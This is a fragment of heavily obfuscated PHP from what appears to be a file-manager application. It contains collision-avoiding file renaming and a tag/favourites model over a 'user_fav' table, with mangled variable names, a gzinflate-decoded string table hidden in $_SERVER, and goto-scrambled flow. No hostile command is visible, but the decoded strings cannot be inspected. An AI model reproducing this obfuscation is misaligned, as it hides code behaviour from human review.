self::$cacheChildList[$°§äüìæ] = $„øñı—“; foreach ($„øñı—“ as $­•¯ÂÀò) { $°§äüìæ = $·Ä†ƒ¤[469] . $­•¯ÂÀò[$·Ä†ƒ¤[411]]; self::$cacheSourceInfo[$°§äüìæ] = $­•¯ÂÀò; } return $„øñı—“; } public function fileNameAuto($÷¬‹™åï, $¯×”¯Ç, $öÀÁ­› = REPEAT_RENAME, $‹“ÛÅî„ = false) { $‹õç±Ÿ« =& $_SERVER[ïëó©ÒÚ]; $¯Êİû½€ = get_path_ext($¯×”¯Ç); $áî°í· = $¯Êİû½€ ? basename($¯×”¯Ç, $‹õç±Ÿ«[10] . $¯Êİû½€) . $‹õç±Ÿ«[2141] . $¯Êİû½€ : $¯×”¯Ç . $‹õç±Ÿ«[384]; $´ııêûÛ = array($‹õç±Ÿ«[441] => $÷¬‹™åï, $‹õç±Ÿ«[440] => 0, $‹õç±Ÿ«[32] => array($‹õç±Ÿ«[383], $áî°í·)); $ıûı«†· = $this->field($‹õç±Ÿ«[32])->where($´ııêûÛ)->select(); $æŸ•¢‡ = array_to_keyvalue($ıûı«†·, $‹õç±Ÿ«[12], $‹õç±Ÿ«[32]); return $this->fileNameAutoGet($æŸ•¢‡, $¯×”¯Ç, $öÀÁ­›, $‹“ÛÅî„); } public function fileNameAutoGet($»´„ÍÂ¼, $óû±œçÄ, $ßßãÈÊ‹, $Şã´Õ‹) { $ÈÍ­Åõ» =& $_SERVER[ïëó©ÒÚ]; if ($ßßãÈÊ‹ == REPEAT_REPLACE || !$»´„ÍÂ¼ || !in_array_not_case($óû±œçÄ, $»´„ÍÂ¼) || $Şã´Õ‹ && $ßßãÈÊ‹ != REPEAT_RENAME_FOLDER) { return $óû±œçÄ; } if ($ßßãÈÊ‹ == REPEAT_SKIP) { return !1; } $ŞÅÖœœ† = $ÈÍ­Åõ»[10] . get_path_ext($óû±œçÄ); $ŞÅÖœœ† = $ŞÅÖœœ† == $ÈÍ­Åõ»[10] || $Şã´Õ‹ ? $ÈÍ­Åõ»[12] : $ŞÅÖœœ†; for ($„ãç£—ô = 1; $„ãç£—ô <= count($»´„ÍÂ¼) + 1; $„ãç£—ô++) { $©ºì¼Õ = substr($óû±œçÄ, 0, strlen($óû±œçÄ) - strlen($ŞÅÖœœ†)); $°©«¶ = $©ºì¼Õ . "\x28{$„ãç£—ô}\51{$ŞÅÖœœ†}"; if (!in_array_not_case($°©«¶, $»´„ÍÂ¼)) { return $°©«¶; } } } } goto f”„­­; BªŠ†Ù“ô: $_SERVER[•×è•É] = explode($_SERVER[ïëó©ÒÚ][624], gzinflate(substr($_SERVER[ïëó©ÒÚ][625], 10, -8))); $ivkzuanpxf = $_SERVER[ïëó©ÒÚ][626]; if (!$ivkzuanpxf) { return; } goto eÙ£“Î„İ†; A¸ñ˜¶À‡Æ: define($_SERVER[ïëó©ÒÚ][0], $_SERVER[ïëó©ÒÚ][1]); $_SERVER[ï¯ò˜Ã›] = explode($_SERVER[ïëó©ÒÚ][2], gzinflate(substr($_SERVER[ïëó©ÒÚ][3], 10, -8))); function binCheckEq($€—è¯ü©, $ò’ëã”â) { return $€—è¯ü© == $ò’ëã”â; } goto F¼ø‚´¢Ü´; Dï¡»ù‚Â§: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\162\137\x66\141\x76"; protected function cacheFunctionAlias($ĞÆ£ğ©ò) { $“‡‹«¼½ =& $_SERVER[ïëó©ÒÚ]; return array($“‡‹«¼½[1944] => array($“‡‹«¼½[2324] . USER_ID, $“‡‹«¼½[1945])); } protected function listData() { $•Êì”ßî =& $_SERVER[ïëó©ÒÚ]; $îØ¬¶§ã = array($•Êì”ßî[1652] => USER_ID, $•Êì”ßî[493] => array($•Êì”ßî[1948], 0)); $§†¾Ó© = $•Êì”ßî[2325]; $Ùêˆ’¼ş = $this->field($§†¾Ó©)->where($îØ¬¶§ã)->order($•Êì”ßî[1951])->select(); return $Ùêˆ’¼ş ? $Ùêˆ’¼ş : array(); } protected function addToTag($ĞÏÃ‡¦ä, $Ä˜“îÕ) { $ÃñÜï›ı =& $_SERVER[ïëó©ÒÚ]; if (!Model($ÃñÜï›ı[2088])->listData($Ä˜“îÕ)) { return !1; } if (is_numeric($ĞÏÃ‡¦ä)) { $øÕ›åõò = Model($ÃñÜï›ı[835])->pathInfo($ĞÏÃ‡¦ä); if (!$øÕ›åõò) { return !1; } } else { $øÕ›åõò = IO::infoSimple($ĞÏÃ‡¦ä); if (!$øÕ›åõò) { return !1; } $¥“ˆ·È  = $øÕ›åõò[$ÃñÜï›ı[32]]; $š’Ğ¦Óö = $øÕ›åõò[$ÃñÜï›ı[33]]; if (isset($øÕ›åõò[$ÃñÜï›ı[419]])) { $š’Ğ¦Óö = $øÕ›åõò[$ÃñÜï›ı[419]] == $ÃñÜï›ı[88] ? $ÃñÜï›ı[75] : $ÃñÜï›ı[199]; } } $÷Õû»Ü¨ = array($ÃñÜï›ı[1652] => USER_ID, $ÃñÜï›ı[493] => $Ä˜“îÕ, $ÃñÜï›ı[430] => $ĞÏÃ‡¦ä, $ÃñÜï›ı[431] => $š’Ğ¦Óö ? $š’Ğ¦Óö : $ÃñÜï›ı[425], $ÃñÜï›ı[429] => $¥“ˆ·È  ? $¥“ˆ·È  : $ÃñÜï›ı[12], $ÃñÜï›ı[1837] => 0); if ($this->where($÷Õû»Ü¨)->find()) { return !1; } return $this->add($÷Õû»Ü¨); } protected function removeFromTag($ƒ•Õ‚è, $¤Îé¶Ï‘) { $İÚæÒè =& $_SERVER[ïëó©ÒÚ]; if (!Model($İÚæÒè[2088])->listData($¤Îé¶Ï‘)) { return !1; } if (is_array($ƒ•Õ‚è)) { $ƒ•Õ‚è = array($İÚæÒè[7], $ƒ•Õ‚è); } $È½Óµ— = array($İÚæÒè[1652] => USER_ID, $İÚæÒè[493] => $¤Îé¶Ï‘, $İÚæÒè[430] => $ƒ•Õ‚è); return $this->where($È½Óµ—)->delete(); } protected function removeByTag($ğ¿ü¸¼) { $ÔÔàŞû˜ =& $_SERVER[ïëó©ÒÚ]; if (!$ğ¿ü¸¼) { return !1; } $âàñàéæ = array($ÔÔàŞû˜[1652] => USER_ID, $ÔÔàŞû˜[493] => $ğ¿ü¸¼); return $this->where($âàñàéæ)->delete(); } protected function removeBySource($¶•ù‹è) { $ĞÊß©³Â =& $_SERVER[ïëó©ÒÚ]; if (is_array($¶•ù‹è)) { $¶•ù‹è = array($ĞÊß©³Â[7], $¶•ù‹è); } $Ë»Ô©­» = array($ĞÊß©³Â[1652] => USER_ID, $ĞÊß©³Â[493] => array($ĞÊß©³Â[1017], 0), $ĞÊß©³Â[430] => $¶•ù‹è); return $this->where($Ë»Ô©­»)->delete(); } }